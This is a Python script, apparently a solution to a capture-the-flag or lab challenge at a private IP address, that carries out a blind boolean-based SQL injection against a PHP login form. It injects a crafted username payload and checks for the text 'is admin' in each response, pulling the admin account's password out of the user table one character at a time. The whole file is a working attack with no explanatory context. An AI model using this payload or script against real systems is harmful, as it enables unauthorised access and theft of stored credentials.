import requests

headers = {
    'Host': '10.147.245.200',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.1',
    'DNT': '1',
    'Connection': 'keep-alive',
}

params = (
    ('action', 'show'),
)

passwd = ""
for i in range(1,33):
    for j in range(32,127):
        data = {
          'username': "admin'=(ascii(mid((select(passwd)from(user)where(username='admin'))from({})))={})='1".format(i,j),
          'passwd': '123'
        }

        response = requests.post('http://10.147.245.200/03/index.php', headers=headers, params=params, data=data)
        print(data['username'])
        if "is admin" in response.text:
            passwd += chr(j)
            print(chr(j))

print("passwd:" + passwd)